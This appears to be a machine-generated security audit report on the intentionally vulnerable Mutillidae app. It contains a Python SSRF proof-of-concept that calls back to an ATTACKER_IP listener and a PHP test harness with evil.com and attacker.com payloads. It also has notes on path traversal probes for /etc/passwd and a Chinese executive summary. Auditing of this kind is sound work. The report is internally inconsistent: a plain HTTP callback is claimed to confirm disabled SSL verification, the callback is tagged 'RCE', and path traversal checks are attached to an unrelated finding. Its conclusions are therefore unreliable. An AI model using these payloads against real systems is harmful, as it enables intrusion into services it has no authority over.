exploit.exploit_path: User-controlled parameter $pPage -> RemoteFileHandler::remoteSiteIsReachable() -> curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false) -> curl_exec() makes HTTP request without verifying SSL certificate
exploit.exploit_code:
import requests
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
        self.server.received = True

def start_server(port):
    server = HTTPServer(('0.0.0.0', port), Handler)
    server.received = False
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    return server

# === CONFIGURATION ===
TARGET_URL = 'http://localhost:8080/remotefile?pPage='  # change to vulnerable endpoint
ATTACKER_IP = '127.0.0.1'  # change if needed
ATTACKER_PORT = 4444
# =====================

server = start_server(ATTACKER_PORT)
time.sleep(0.5)

# Send exploit with benign callback
payload = f'http://{ATTACKER_IP}:{ATTACKER_PORT}/AUDITAGENTX_RCE_1337'
response = requests.get(TARGET_URL + payload, timeout=10)
print('Response from target:', response.text)

time.sleep(2)  # allow time for callback
if server.received:
    print('[+] SUCCESS: Callback received from target')
    print('[+] Vulnerability confirmed: SSL verification disabled')
else:
    print('[-] No callback received; check target URL and network')

server.shutdown()
exploit.verification_method: Run the exploit script after configuring TARGET_URL and ATTACKER_IP. The script starts a local HTTP server and sends a request to the vulnerable application with pPage pointing to that server. If the application makes a request back to the server (detected via received flag), the exploit is successful. The callback path contains AUDITAGENTX_RCE_1337 as a harmless tag.
exploit.impact: Server-Side Request Forgery (SSRF) and Man-in-the-Middle attacks due to disabled SSL certificate validation. An attacker could probe internal services or intercept HTTPS traffic.

harness.harness_code:
<?php
namespace MyApp;

// Simulate curl functions
$mockCh = 0;
$mockCurlOptions = [];
$mockCurlInfo = [];

function curl_init($url = null) {
    global $mockCh, $mockCurlOptions, $mockCurlInfo;
    $mockCh++;
    $mockCurlOptions[$mockCh] = [];
    $mockCurlInfo[$mockCh] = [];
    return $mockCh;
}

function curl_setopt($ch, $option, $value) {
    global $mockCurlOptions;
    $mockCurlOptions[$ch][$option] = $value;
}

function curl_exec($ch) {
    global $mockCurlOptions, $mockCurlInfo;
    $mockCurlInfo[$ch]['http_code'] = 200;
    return true;
}

function curl_getinfo($ch, $opt = null) {
    global $mockCurlInfo;
    if ($opt === CURLINFO_HTTP_CODE) {
        return $mockCurlInfo[$ch]['http_code'] ?? 0;
    }
    return null;
}

function curl_errno($ch) { return 0; }
function curl_error($ch) { return ''; }
function curl_close($ch) {}

// Mock RequiredSoftwareHandler
class RequiredSoftwareHandler {
    public function isPHPCurlIsInstalled() {
        return true;
    }
}

// RemoteFileHandler class (copied from project)
class RemoteFileHandler {
    public $mRequiredSoftwareHandler;

    public function startsWith($haystack, $needle) {
        return strpos($haystack, $needle) === 0;
    }

    public function remoteSiteIsReachable($pPage) {
        try {
            if ($this->mRequiredSoftwareHandler->isPHPCurlIsInstalled()) {
                $ch = curl_init($pPage);
                curl_setopt($ch, CURLOPT_NOBODY, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $data = curl_exec($ch);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                return ($this->startsWith($httpCode, '2') || $this->startsWith($httpCode, '3') || $this->startsWith($httpCode, '1'));
            }
        } catch (Exception $e) {
            return false;
        }
    }
}

// Test harness
$handler = new RemoteFileHandler();
$handler->mRequiredSoftwareHandler = new RequiredSoftwareHandler();

$payloads = [
    'https://example.com',
    'http://evil.com',
    'https://attacker.com?a=b'
];

$triggered = false;
$sinkCalled = false;
$capturedArgument = '';
$lastPayload = '';

foreach ($payloads as $payload) {
    // Reset mock state
    global $mockCurlOptions, $mockCh;
    $mockCh = 0;
    $mockCurlOptions = [];
    
    $result = $handler->remoteSiteIsReachable($payload);
    
    // Check if curl_setopt was called with CURLOPT_SSL_VERIFYPEER false
    foreach ($mockCurlOptions as $ch => $opts) {
        if (isset($opts[CURLOPT_SSL_VERIFYPEER]) && $opts[CURLOPT_SSL_VERIFYPEER] === false) {
            $sinkCalled = true;
            $capturedArgument = 'CURLOPT_SSL_VERIFYPEER => false';
            $lastPayload = $payload;
            break;
        }
    }
    if ($sinkCalled) {
        $triggered = true;
        break;
    }
}

if ($triggered) {
    echo "AUDITAGENTX_VULN_TRIGGERED\n";
} else {
    echo "AUDITAGENTX_NO_TRIGGER\n";
}

$result = [
    'triggered' => $triggered,
    'target_function_called' => true,
    'sink_called' => $sinkCalled,
    'sink_name' => 'curl_setopt',
    'captured_argument' => $capturedArgument,
    'payload' => $lastPayload,
    'trigger_detail' => 'curl_setopt called with CURLOPT_SSL_VERIFYPEER => false, disabling SSL verification'
];
echo "AUDITAGENTX_RESULT_JSON=" . json_encode($result) . "\n";

verification_checks: Confirm the user-controlled value is concatenated or joined into a filesystem path.
Check whether the code canonicalizes the path (realpath/abspath) and enforces an allowlisted base directory.
If a local target runs, send ../ or encoded ..%2f payloads for a known file (app config, /etc/passwd) and look for file contents in the response.
If no target exists, record dynamic_verdict=not_executed instead of not_reproduced.
false_positive_signals: The resolved path is validated to stay under an allowlisted base directory.
The filename is a fixed server-side constant or comes from a strict allowlist.
The framework normalizes and rejects traversal sequences before use.
remediation: Canonicalize the path and confirm it stays under an allowlisted base directory.
Reject traversal sequences and use safe file APIs.

security_knowledge.title: Path Traversal Verification Playbook
security_knowledge.summary: Verify path traversal by confirming attacker-controlled input reaches a filesystem API without canonicalization or a base-directory allowlist.

security_knowledge.title: Insecure Deserialization
security_knowledge.summary: Untrusted data is deserialized without validation, allowing object injection or remote code execution.
owasp: A08:2021 Software and Data Integrity Failures
verification_checks: Confirm untrusted input is passed to a deserialization sink.
Confirm the deserializer can instantiate arbitrary classes or call __reduce__.
Confirm no integrity check (HMAC/signature) protects the serialized blob.
false_positive_signals: Only json.loads / yaml.safe_load is used on the untrusted data.
The serialized data is signed and verified before deserialization.
The input is a trusted, application-generated constant.
remediation: Prefer safe formats (JSON) and safe loaders (yaml.safe_load).
Never deserialize untrusted data with pickle/unserialize/ObjectInputStream.
If unavoidable, sign+verify payloads and restrict allowed classes.

security_knowledge.title: SQL Injection
security_knowledge.summary: Externally influenced input is used to construct SQL without sufficient separation between data and query structure.
verification_checks: Confirm user-controlled input reaches SQL construction or execution.
Confirm the query is built with string concatenation, interpolation, or formatting.
Confirm no prepared statement, parameter binding, or strong type conversion separates data from SQL.
false_positive_signals: The sink uses parameter placeholders with a separate parameter tuple/list.
The value is converted to a strict numeric type before reaching SQL.
The SQL statement is a static literal and user input is not interpolated.
remediation: Use prepared statements or parameterized queries.
Do not concatenate user-controlled strings into SQL.
Run database users with least privilege and avoid detailed SQL errors in responses.

summary.executive_summary: 本次审计对象为 Mutillidae，来源为 https://github.com/webpwnized/mutillidae，项目主要语言为 PHP、JavaScript、Shell，框架识别结果为 未识别，共解析 191 个文件、39411 行代码。AuditAgentX 的流程先由 RepoParserAgent 建立项目画像，再由 StaticScanAgent 调用静态规则和 SAST 工具产生候选漏洞，AuditAgent 补充语义层面的风险发现，VerifyAgent 独立复核并过滤误报，随后 ExploitAgent/DynamicVerifier 对可验证漏洞生成授权 PoC 并保存运行证据，最后由 SummaryAgent 汇总为本报告。当前共发现 336 条风险，其中 Critical 0 条、High 32 条、Medium 112 条、Low 192 条；静态分析覆盖 336 条，动态验证覆盖 1 条，其中 0 条已复现。主要风险类型集中在 XSS(182)、github-actions-mutable-action-tag(29)、Command Injection(25)、SQL Injection(18)，总体风险评级为 HIGH。
summary.static_summary: 静态分析阶段合并 SAST 工具、硬编码密钥检测和自定义规则结果，共形成 336 条静态风险。主要来源分布为 custom-taint(265)、semgrep(71)。这些结果先作为候选项进入 VerifyAgent，避免仅凭规则命中直接下结论。
summary.dynamic_summary: 动态验证阶段对 1 条漏洞保存了运行证据，其中 0 条具备可复现结果。报告中的 Source、Sink、调用路径、PoC 和 runtime 证据共同构成证据链。
workflow_summary: RepoParserAgent：解析仓库结构、语言、框架、入口文件、依赖与代码规模，为后续审计提供项目画像。
StaticScanAgent：调用 Semgrep、Gitleaks、自定义规则等工具进行静态扫描，产出 SQL 注入、命令注入、路径遍历、硬编码密钥等候选风险。
AuditAgent：基于 LLM 对代码上下文做语义审计，补充传统 SAST 工具可能漏掉的业务逻辑与调用链风险。
VerifyAgent：独立复核候选漏洞，调用本地代码上下文读取、启发式分析和 SAST replay 工具过滤误报。
ExploitAgent / DynamicVerifier：为已确认漏洞生成授权 PoC、触发路径和利用代码，并在本地靶场或授权目标上保存动态验证证据。
SummaryAgent：汇总项目概况、静态/动态结果、证据链和修复优先级，生成执行摘要与修改建议。

remediation_plan.title: 优先修复 Critical/High 漏洞
remediation_plan.detail: 先处理已确认、已复现或处于核心入口路径上的高危问题，修复后重新扫描并保留复测证据。

remediation_plan.title: 按漏洞类型批量治理
remediation_plan.detail: 对 SQL 注入、命令注入、路径遍历等同类问题统一采用参数化查询、白名单校验和安全 API。

remediation_plan.title: 补充动态验证覆盖
remediation_plan.detail: 为高危候选漏洞配置本地靶场或授权 URL，让 ExploitAgent/DynamicVerifier 生成可复现证据。

remediation_plan.title: 纳入持续审计流程
remediation_plan.detail: 将静态扫描、VerifyAgent 复核和报告生成接入提交前或 CI 流程，避免修复后回归。

summary.conclusion: 综合项目规模、漏洞数量、严重等级和验证结果，当前项目处于 HIGH 风险水平。建议先处理已确认的高危/可复现漏洞，再统一治理同类输入校验、权限控制、敏感信息管理和依赖安全问题。
